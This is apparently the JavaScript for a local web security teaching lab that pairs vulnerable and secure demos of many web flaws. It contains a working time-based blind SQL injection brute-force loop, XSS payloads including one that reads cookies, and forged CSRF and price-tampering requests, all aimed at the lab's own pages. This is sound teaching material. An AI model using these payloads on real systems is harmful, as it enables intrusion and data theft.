document.addEventListener('DOMContentLoaded', () => {
    // 簡單的特效：滑鼠移動時，背景光球會微調位置，增加動態感
    const orb1 = document.querySelector('.orb-1');
    const orb2 = document.querySelector('.orb-2');

    document.addEventListener('mousemove', (e) => {
        const x = e.clientX / window.innerWidth;
        const y = e.clientY / window.innerHeight;

        if (orb1 && orb2) {
            orb1.style.transform = `translate(${x * 30}px, ${y * 30}px)`;
            orb2.style.transform = `translate(-${x * 40}px, -${y * 40}px)`;
        }
    });

    // 平滑的滾動進入動畫 (Scroll Animation)
    const panels = document.querySelectorAll('.glass-panel');
    const observerOptions = {
        threshold: 0.15,
        rootMargin: "0px 0px -50px 0px"
    };

    const observer = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = 1;
                entry.target.style.transform = 'translateY(0)';
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);

    panels.forEach(panel => {
        panel.style.opacity = 0;
        panel.style.transform = 'translateY(30px)';
        panel.style.transition = 'opacity 0.6s ease-out, transform 0.6s ease-out';
        observer.observe(panel);
    });

    // 實戰演練：初始化資料庫
    const btnInitDb = document.getElementById('btn-init-db');
    const initStatus = document.getElementById('init-status');
    if (btnInitDb) {
        btnInitDb.addEventListener('click', async () => {
            btnInitDb.disabled = true;
            initStatus.style.color = '#fff';
            initStatus.textContent = '🔄 初始化中...';
            try {
                const response = await fetch('setup.php');
                const data = await response.json();
                if (data.status === 'success') {
                    initStatus.style.color = '#4dffb8';
                    initStatus.textContent = '✅ ' + data.message;
                } else {
                    initStatus.style.color = '#ff4b4b';
                    initStatus.textContent = '❌ ' + data.message;
                }
            } catch (err) {
                initStatus.style.color = '#ff4b4b';
                initStatus.textContent = '❌ 請求失敗，請確認 XAMPP 是否啟動。';
            } finally {
                btnInitDb.disabled = false;
            }
        });
    }

    // 處理表單提交的共用函數
    async function handleFormSubmit(e, url, resultBoxId) {
        e.preventDefault();
        const form = e.target;
        const resultBox = document.getElementById(resultBoxId);
        const formData = new FormData(form);

        resultBox.innerHTML = '<span style="color:#aaa;">連線中...</span>';
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            const text = await response.text();
            resultBox.innerHTML = text;
        } catch (err) {
            resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
        }
    }

    // 實戰演練：Vulnerable Code 測試
    const formVulnerable = document.getElementById('form-vulnerable');
    if (formVulnerable) {
        formVulnerable.addEventListener('submit', (e) => handleFormSubmit(e, 'login.php', 'result-vulnerable'));
    }

    // 實戰演練：Secure Code 測試
    const formSecure = document.getElementById('form-secure');
    if (formSecure) {
        formSecure.addEventListener('submit', (e) => handleFormSubmit(e, 'secure_login.php', 'result-secure'));
    }

    // 處理 Time-Based 表單提交並計時
    async function handleTimeFormSubmit(e, url, resultBoxId, timeDisplayId) {
        e.preventDefault();
        const form = e.target;
        const resultBox = document.getElementById(resultBoxId);
        const timeDisplay = document.getElementById(timeDisplayId);
        const timeSpan = timeDisplay.querySelector('.seconds');
        const formData = new FormData(form);

        resultBox.innerHTML = '<span style="color:#aaa;">連線中...</span>';
        timeDisplay.style.display = 'block';
        timeSpan.textContent = '計算中...';
        
        const startTime = Date.now();
        let timerInterval = setInterval(() => {
            const currentDuration = ((Date.now() - startTime) / 1000).toFixed(2);
            timeSpan.textContent = currentDuration;
        }, 50);

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData
            });
            const text = await response.text();
            clearInterval(timerInterval);
            
            const totalDuration = ((Date.now() - startTime) / 1000).toFixed(2);
            timeSpan.textContent = totalDuration;
            resultBox.innerHTML = text;
        } catch (err) {
            clearInterval(timerInterval);
            timeSpan.textContent = '失敗';
            resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
        }
    }

    // Time-Based 實戰演練：Vulnerable
    const formTimeVulnerable = document.getElementById('form-time-vulnerable');
    if (formTimeVulnerable) {
        formTimeVulnerable.addEventListener('submit', (e) => handleTimeFormSubmit(e, 'time_login.php', 'result-time-vulnerable', 'time-display-vulnerable'));
    }

    // Time-Based 實戰演練：Secure
    const formTimeSecure = document.getElementById('form-time-secure');
    if (formTimeSecure) {
        formTimeSecure.addEventListener('submit', (e) => handleTimeFormSubmit(e, 'time_secure.php', 'result-time-secure', 'time-display-secure'));
    }

    // Hacker Simulator Logic
    const btnStartSimulator = document.getElementById('btn-start-simulator');
    if (btnStartSimulator) {
        btnStartSimulator.addEventListener('click', async () => {
            btnStartSimulator.disabled = true;
            btnStartSimulator.textContent = '🔄 盲注腳本執行中...';
            
            const simPosition = document.getElementById('sim-position');
            const simChar = document.getElementById('sim-char');
            const simTime = document.getElementById('sim-time');
            const simLog = document.getElementById('sim-log');
            const simCrackedWord = document.getElementById('sim-cracked-word');
            
            simLog.innerHTML = '<div>[System] 啟動自動盲注腳本...</div>';
            let crackedResult = ['_', '_', '_', '_'];
            simCrackedWord.textContent = crackedResult.join(' ');
            
            const alphabet = 'abcdefghijklmnopqrstuvwxyz';
            let foundAll = true;

            for (let n = 1; n <= 4; n++) {
                simPosition.textContent = n;
                let foundChar = false;
                
                for (let i = 0; i < alphabet.length; i++) {
                    const char = alphabet[i];
                    simChar.textContent = char;
                    
                    // Payload to guess 4-letter database name
                    const payload = `1 AND (SELECT IF(SUBSTRING((SELECT schema_name FROM information_schema.schemata WHERE CHAR_LENGTH(schema_name)=4 AND schema_name NOT IN ('information_schema','performance_schema','mysql','phpmyadmin') LIMIT 1), ${n}, 1)='${char}', SLEEP(2), 0))`;
                    
                    const formData = new FormData();
                    formData.append('id', payload);
                    
                    const startTime = Date.now();
                    
                    // Update timer UI
                    let timerInterval = setInterval(() => {
                        simTime.textContent = ((Date.now() - startTime) / 1000).toFixed(2) + ' s';
                    }, 50);

                    try {
                        await fetch('time_login.php', { method: 'POST', body: formData });
                    } catch (e) {
                        simLog.innerHTML += `<div style="color:var(--danger)">[Error] 請求失敗</div>`;
                        clearInterval(timerInterval);
                        break;
                    }

                    clearInterval(timerInterval);
                    const duration = (Date.now() - startTime) / 1000;
                    simTime.textContent = duration.toFixed(2) + ' s';
                    
                    if (duration > 1.8) {
                        // Delay detected!
                        simLog.innerHTML += `<div style="color:var(--success)">[Hit] 位置 ${n} 猜中字母 '${char}'！ (耗時 ${duration.toFixed(2)}s)</div>`;
                        crackedResult[n-1] = char;
                        simCrackedWord.textContent = crackedResult.join(' ');
                        foundChar = true;
                        simLog.scrollTop = simLog.scrollHeight;
                        break; 
                    } else {
                        simLog.innerHTML += `<div>[Miss] 測試 '${char}' 失敗 (耗時 ${duration.toFixed(2)}s)</div>`;
                        simLog.scrollTop = simLog.scrollHeight;
                    }
                }
                
                if (!foundChar) {
                    simLog.innerHTML += `<div style="color:var(--danger)">[Fail] 無法猜出第 ${n} 個字母，可能目標資料庫不存在。</div>`;
                    foundAll = false;
                    break;
                }
            }
            
            if (foundAll) {
                simLog.innerHTML += `<div style="color:var(--success); font-weight:bold; margin-top:10px; font-size:1.1em;">[Success] 資料庫破解完成：${crackedResult.join('')}</div>`;
            }
            
            btnStartSimulator.disabled = false;
            btnStartSimulator.textContent = '🚀 再次開始自動盲注';
        });
    }

    // =====================================
    // CSRF 實戰演練邏輯
    // =====================================

    // 初始化：抓取 CSRF Token (安全寫法需要)
    const secureTokenInput = document.getElementById('secure-csrf-token');
    if (secureTokenInput) {
        fetch('secure_csrf_transfer.php')
            .then(res => res.text())
            .then(token => {
                secureTokenInput.value = token.trim();
            })
            .catch(err => console.error('無法獲取 CSRF Token:', err));
    }

    // 1. 危險寫法 - 正常發送轉帳
    const formCsrfVulnerable = document.getElementById('form-csrf-vulnerable');
    if (formCsrfVulnerable) {
        formCsrfVulnerable.addEventListener('submit', (e) => handleFormSubmit(e, 'csrf_transfer.php', 'result-csrf-vulnerable'));
    }

    // 2. 危險寫法 - 模擬駭客攻擊
    const btnCsrfAttack = document.getElementById('btn-csrf-attack');
    if (btnCsrfAttack) {
        btnCsrfAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-csrf-vulnerable');
            resultBox.innerHTML = '<span style="color:#aaa;">駭客腳本發送偽造請求中...</span>';
            
            // 模擬駭客建構的表單資料 (此時瀏覽器會自動帶上 Session Cookie)
            const formData = new FormData();
            formData.append('to', 'hacker_account');
            formData.append('amount', '99999');

            try {
                const response = await fetch('csrf_transfer.php', {
                    method: 'POST',
                    body: formData
                });
                const text = await response.text();
                resultBox.innerHTML = text + `<div style="margin-top:10px; border-top:1px solid #444; padding-top:10px; color:#ff4b4b; font-size:0.9em;">
                    💀 駭客表示：感謝您的慷慨贊助！(因為沒有 Token 保護，伺服器只認 Cookie 就放行了)
                </div>`;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // 3. 安全寫法 - 正常發送轉帳
    const formCsrfSecure = document.getElementById('form-csrf-secure');
    if (formCsrfSecure) {
        formCsrfSecure.addEventListener('submit', (e) => handleFormSubmit(e, 'secure_csrf_transfer.php', 'result-csrf-secure'));
    }

    // 4. 安全寫法 - 模擬駭客攻擊
    const btnCsrfSecureAttack = document.getElementById('btn-csrf-secure-attack');
    if (btnCsrfSecureAttack) {
        btnCsrfSecureAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-csrf-secure');
            resultBox.innerHTML = '<span style="color:#aaa;">駭客腳本發送偽造請求中...</span>';
            
            // 模擬駭客建構的表單資料 (駭客無法猜到 Token)
            const formData = new FormData();
            formData.append('to', 'hacker_account');
            formData.append('amount', '99999');
            // 故意帶錯 Token 或者不帶 Token
            formData.append('csrf_token', 'fake_token_12345');

            try {
                const response = await fetch('secure_csrf_transfer.php', {
                    method: 'POST',
                    body: formData
                });
                const text = await response.text();
                resultBox.innerHTML = text + `<div style="margin-top:10px; border-top:1px solid #444; padding-top:10px; color:#4dffb8; font-size:0.9em;">
                    🛡️ 防護成功：駭客因為無法取得您當前 Session 綁定的 Token，攻擊被伺服器拒絕了！
                </div>`;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // =====================================
    // CSP 實戰演練邏輯
    // =====================================

    const formCspVulnerable = document.getElementById('form-csp-vulnerable');
    if (formCspVulnerable) {
        formCspVulnerable.addEventListener('submit', (e) => {
            e.preventDefault();
            const q = e.target.querySelector('input[name="q"]').value;
            const iframe = document.getElementById('iframe-csp-vulnerable');
            // 將搜尋字串帶入 iframe，觸發 GET 請求
            iframe.src = 'csp_vulnerable.php?q=' + encodeURIComponent(q);
        });
    }

    const formCspSecure = document.getElementById('form-csp-secure');
    if (formCspSecure) {
        formCspSecure.addEventListener('submit', (e) => {
            e.preventDefault();
            const q = e.target.querySelector('input[name="q"]').value;
            const iframe = document.getElementById('iframe-csp-secure');
            // 將搜尋字串帶入 iframe，觸發 GET 請求
            iframe.src = 'csp_secure.php?q=' + encodeURIComponent(q);
        });
    }

    // =====================================
    // Clickjacking 實戰演練邏輯
    // =====================================
    const toggleOpacity = document.getElementById('toggle-opacity');
    if (toggleOpacity) {
        toggleOpacity.addEventListener('change', (e) => {
            const iframes = document.querySelectorAll('.cj-iframe');
            if (e.target.checked) {
                // 顯示隱藏的 iframe，讓學生看到駭客的把戲
                iframes.forEach(iframe => {
                    iframe.style.opacity = '0.7';
                });
            } else {
                // 恢復駭客原本的隱形設定
                iframes.forEach(iframe => {
                    iframe.style.opacity = '0.001';
                });
            }
        });
    }

    // =====================================
    // Parameter Tampering 實戰演練邏輯
    // =====================================

    // 1. 危險寫法 - 正常結帳
    const formParamVulnerable = document.getElementById('form-param-vulnerable');
    if (formParamVulnerable) {
        formParamVulnerable.addEventListener('submit', (e) => handleFormSubmit(e, 'param_vulnerable.php', 'result-param-vulnerable'));
    }

    // 2. 危險寫法 - 模擬駭客篡改價格
    const btnParamAttack = document.getElementById('btn-param-attack');
    if (btnParamAttack) {
        btnParamAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-param-vulnerable');
            resultBox.innerHTML = '<span style="color:#aaa;">送出結帳中...</span>';
            
            // 模擬 F12 將 price 欄位改為 1
            const formData = new FormData();
            formData.append('item_id', '101');
            formData.append('price', '1'); 
            formData.append('qty', '1');

            try {
                const response = await fetch('param_vulnerable.php', { method: 'POST', body: formData });
                resultBox.innerHTML = await response.text() + `<div style="margin-top:10px; border-top:1px solid #444; padding-top:10px; color:#ff4b4b; font-size:0.9em;">
                    💀 駭客表示：只要按個 F12 就能用 1 塊錢買走 5 萬元的筆電，這家公司完蛋了！
                </div>`;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // 3. 安全寫法 - 正常結帳
    const formParamSecure = document.getElementById('form-param-secure');
    if (formParamSecure) {
        formParamSecure.addEventListener('submit', (e) => handleFormSubmit(e, 'param_secure.php', 'result-param-secure'));
    }

    // 4. 安全寫法 - 模擬駭客篡改價格
    const btnParamSecureAttack = document.getElementById('btn-param-secure-attack');
    if (btnParamSecureAttack) {
        btnParamSecureAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-param-secure');
            resultBox.innerHTML = '<span style="color:#aaa;">送出結帳中...</span>';
            
            // 模擬 F12 將 price 欄位改為 1
            const formData = new FormData();
            formData.append('item_id', '101');
            formData.append('price', '1'); 
            formData.append('qty', '1');

            try {
                const response = await fetch('param_secure.php', { method: 'POST', body: formData });
                resultBox.innerHTML = await response.text() + `<div style="margin-top:10px; border-top:1px solid #444; padding-top:10px; color:#4dffb8; font-size:0.9em;">
                    🛡️ 防護成功：駭客即使在前端怎麼亂改，後端根本不屑一顧，直接從資料庫查出真實定價來扣款！
                </div>`;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // =====================================
    // Vulnerable JS 實戰演練邏輯
    // =====================================
    const btnJsAttack = document.getElementById('btn-js-attack');
    if (btnJsAttack) {
        btnJsAttack.addEventListener('click', () => {
            // 包含 XSS Payload 的 Hash
            const payload = "#<img src=x onerror=alert('【嚴重警告】\\n您被_XSS_攻擊了！\\n這是因為老舊的_jQuery_1.10.2_漏洞所導致！')>";
            document.getElementById('url-vuln').innerText = "https://example.com/js_vulnerable.php" + payload;
            
            // 更新 iframe src 來觸發 hashchange 或重新載入
            document.getElementById('iframe-js-vuln').src = "js_vulnerable.php" + payload;
        });
    }

    const btnJsSecureAttack = document.getElementById('btn-js-secure-attack');
    if (btnJsSecureAttack) {
        btnJsSecureAttack.addEventListener('click', () => {
            const payload = "#<img src=x onerror=alert('⚠️_您被_XSS_攻擊了！')>";
            document.getElementById('url-secure').innerText = "https://example.com/js_secure.php" + payload;
            
            // 更新 iframe src，但在 jQuery 3.x 這是安全的
            document.getElementById('iframe-js-secure').src = "js_secure.php" + payload;
        });
    }

    // =====================================
    // Cookie No HttpOnly 實戰演練邏輯
    // =====================================
    const btnCookieAttack = document.getElementById('btn-cookie-attack');
    if (btnCookieAttack) {
        btnCookieAttack.addEventListener('click', () => {
            // 惡意 XSS 腳本：竊取 document.cookie
            const payload = "<script>alert('😈 駭客成功竊取 Cookie:\\n' + document.cookie);</script>";
            document.getElementById('url-cookie-vuln').innerText = "https://example.com/cookie_vulnerable.php?comment=" + encodeURIComponent(payload);
            
            document.getElementById('iframe-cookie-vuln').src = "cookie_vulnerable.php?comment=" + encodeURIComponent(payload);
        });
    }

    const btnCookieSecureAttack = document.getElementById('btn-cookie-secure-attack');
    if (btnCookieSecureAttack) {
        btnCookieSecureAttack.addEventListener('click', () => {
            // 同樣的惡意 XSS 腳本，但因為 HttpOnly 標籤，拿不到 session_id_secure
            const payload = "<script>alert('🛡️ XSS 雖然觸發了，但竊取到的 Cookie:\\n' + document.cookie + '\\n\\n(因為 HttpOnly，您看不到 session_id_secure)');</script>";
            document.getElementById('url-cookie-secure').innerText = "https://example.com/cookie_secure.php?comment=" + encodeURIComponent(payload);
            
            document.getElementById('iframe-cookie-secure').src = "cookie_secure.php?comment=" + encodeURIComponent(payload);
        });
    }

    // =====================================
    // SameSite Attribute 實戰演練邏輯
    // =====================================
    function submitToIframe(url, iframeId) {
        // 創建一個隱藏表單來模擬真實的跨站 POST 請求
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = url;
        form.target = iframeId; // 目標設為 iframe 的 name 屬性

        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'action';
        input.value = 'delete';
        
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    const btnSamesiteAttack = document.getElementById('btn-samesite-attack');
    if (btnSamesiteAttack) {
        btnSamesiteAttack.addEventListener('click', () => {
            document.getElementById('url-samesite-vuln').innerText = "https://evil.com/ 發送跨站 POST 請求至 shop.com/samesite_vulnerable.php";
            submitToIframe('samesite_vulnerable.php', 'iframe-samesite-vuln');
        });
    }

    const btnSamesiteSecureAttack = document.getElementById('btn-samesite-secure-attack');
    if (btnSamesiteSecureAttack) {
        btnSamesiteSecureAttack.addEventListener('click', () => {
            document.getElementById('url-samesite-secure').innerText = "https://evil.com/ 發送跨站 POST 請求至 shop.com/samesite_secure.php";
            submitToIframe('samesite_secure.php', 'iframe-samesite-secure');
        });
    }

    // =====================================
    // X-Powered-By Header 實戰演練邏輯
    // =====================================
    const btnXpbAttack = document.getElementById('btn-xpb-attack');
    if (btnXpbAttack) {
        btnXpbAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-xpb-vuln');
            resultBox.innerHTML = '<span style="color:#aaa;">掃描器請求中...</span>';
            
            try {
                const res = await fetch('xpoweredby_vulnerable.php');
                const data = await res.json();
                
                let headersHtml = data.headers.map(h => {
                    if (h.toLowerCase().startsWith('x-powered-by') || h.toLowerCase().startsWith('server')) {
                        return `<span style="color:#ff4b4b; font-weight:bold;">${h}</span>`;
                    }
                    return h;
                }).join('\n');
                
                let html = `<div style="font-family: monospace; white-space: pre-wrap; line-height: 1.6;">HTTP/1.1 200 OK\n${headersHtml}</div>`;
                
                html += `<div style="margin-top:10px; border-top:1px dashed #ff4b4b; padding-top:10px; color:#ff4b4b; font-size:0.9em;">
                    💀 掃描器警告：發現明確的版本號！駭客將立刻在 Exploit-DB 尋找該版本的遠端代碼執行 (RCE) 攻擊代碼。
                </div>`;
                resultBox.innerHTML = html;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    const btnXpbSecureAttack = document.getElementById('btn-xpb-secure-attack');
    if (btnXpbSecureAttack) {
        btnXpbSecureAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-xpb-secure');
            resultBox.innerHTML = '<span style="color:#aaa;">掃描器請求中...</span>';
            
            try {
                const res = await fetch('xpoweredby_secure.php');
                const data = await res.json();
                
                let headersHtml = data.headers.map(h => {
                    if (h.toLowerCase().startsWith('server')) {
                        return `<span style="color:#4dffb8; font-weight:bold;">${h}</span>`;
                    }
                    return h;
                }).join('\n');
                
                let html = `<div style="font-family: monospace; white-space: pre-wrap; line-height: 1.6;">HTTP/1.1 200 OK\n${headersHtml}</div>`;
                
                html += `<div style="margin-top:10px; border-top:1px dashed #4dffb8; padding-top:10px; color:#4dffb8; font-size:0.9em;">
                    🛡️ 防護成功：伺服器隱藏了真實的技術架構與版本號，增加了駭客進行情報蒐集的難度！
                </div>`;
                resultBox.innerHTML = html;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // =====================================
    // Server Header 實戰演練邏輯
    // =====================================
    const btnServerAttack = document.getElementById('btn-server-attack');
    if (btnServerAttack) {
        btnServerAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-server-vuln');
            resultBox.innerHTML = '<span style="color:#aaa;">掃描器請求中...</span>';
            
            try {
                const res = await fetch('serverheader_vulnerable.php');
                const data = await res.json();
                
                let headersHtml = data.headers.map(h => {
                    if (h.toLowerCase().startsWith('server')) {
                        return `<span style="color:#ff4b4b; font-weight:bold;">${h}</span>`;
                    }
                    return h;
                }).join('\n');
                
                let html = `<div style="font-family: monospace; white-space: pre-wrap; line-height: 1.6;">HTTP/1.1 200 OK\n${headersHtml}</div>`;
                
                html += `<div style="margin-top:10px; border-top:1px dashed #ff4b4b; padding-top:10px; color:#ff4b4b; font-size:0.9em;">
                    💀 掃描器警告：發現極度詳細的伺服器與作業系統版本！駭客可立即鎖定 Apache 2.2.15 尋找 CVE 已知漏洞進行一鍵攻擊 (One-Click Exploit)。
                </div>`;
                resultBox.innerHTML = html;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    const btnServerSecureAttack = document.getElementById('btn-server-secure-attack');
    if (btnServerSecureAttack) {
        btnServerSecureAttack.addEventListener('click', async () => {
            const resultBox = document.getElementById('result-server-secure');
            resultBox.innerHTML = '<span style="color:#aaa;">掃描器請求中...</span>';
            
            try {
                const res = await fetch('serverheader_secure.php');
                const data = await res.json();
                
                let headersHtml = data.headers.map(h => {
                    if (h.toLowerCase().startsWith('server')) {
                        return `<span style="color:#4dffb8; font-weight:bold;">${h}</span>`;
                    }
                    return h;
                }).join('\n');
                
                let html = `<div style="font-family: monospace; white-space: pre-wrap; line-height: 1.6;">HTTP/1.1 200 OK\n${headersHtml}</div>`;
                
                html += `<div style="margin-top:10px; border-top:1px dashed #4dffb8; padding-top:10px; color:#4dffb8; font-size:0.9em;">
                    🛡️ 防護成功：伺服器僅顯示軟體名稱，隱藏了精確版本號與作業系統資訊，成功套用了「最小資訊揭露」原則！
                </div>`;
                resultBox.innerHTML = html;
            } catch (err) {
                resultBox.innerHTML = '<span style="color:#ff4b4b;">❌ 請求失敗，請確認 XAMPP 是否啟動。</span>';
            }
        });
    }

    // =====================================
    // X-Content-Type-Options (nosniff) 實戰演練邏輯
    // =====================================
    const btnNosniffAttack = document.getElementById('btn-nosniff-attack');
    if (btnNosniffAttack) {
        btnNosniffAttack.addEventListener('click', () => {
            const resultBox = document.getElementById('result-nosniff-vuln');
            resultBox.innerHTML = '<span style="color:#aaa;">嘗試以 &lt;script&gt; 標籤載入 user_upload.txt...</span>';
            
            // 建立 script 標籤載入 vulnerable.php (模擬載入 user_upload.txt)
            // 加上隨機參數避免快取
            const script = document.createElement('script');
            script.src = 'nosniff_vulnerable.php?r=' + Math.random();
            script.onload = () => {
                resultBox.innerHTML += `<div style="margin-top:10px; color:#ff4b4b;">💀 載入並執行成功！瀏覽器嗅探了內容並將其作為腳本執行。</div>`;
            };
            script.onerror = () => {
                resultBox.innerHTML += `<div style="margin-top:10px; color:#4dffb8;">🛡️ 載入失敗 (被瀏覽器阻擋)。</div>`;
            };
            document.body.appendChild(script);
        });
    }

    const btnNosniffSecureAttack = document.getElementById('btn-nosniff-secure-attack');
    if (btnNosniffSecureAttack) {
        btnNosniffSecureAttack.addEventListener('click', () => {
            const resultBox = document.getElementById('result-nosniff-secure');
            resultBox.innerHTML = '<span style="color:#aaa;">嘗試以 &lt;script&gt; 標籤載入 user_upload.txt...</span>';
            
            const script = document.createElement('script');
            script.src = 'nosniff_secure.php?r=' + Math.random();
            script.onload = () => {
                resultBox.innerHTML += `<div style="margin-top:10px; color:#ff4b4b;">💀 載入並執行成功！</div>`;
            };
            script.onerror = () => {
                resultBox.innerHTML += `<div style="margin-top:10px; color:#4dffb8; line-height:1.5;">🛡️ 防護成功：瀏覽器因為 nosniff 指令與 MIME 類型不符 (text/plain)，拒絕執行該腳本！<br>(您可以按 F12 打開 Console 查看瀏覽器報錯 CORB/MIME type mismatch)</div>`;
            };
            document.body.appendChild(script);
        });
    }
});
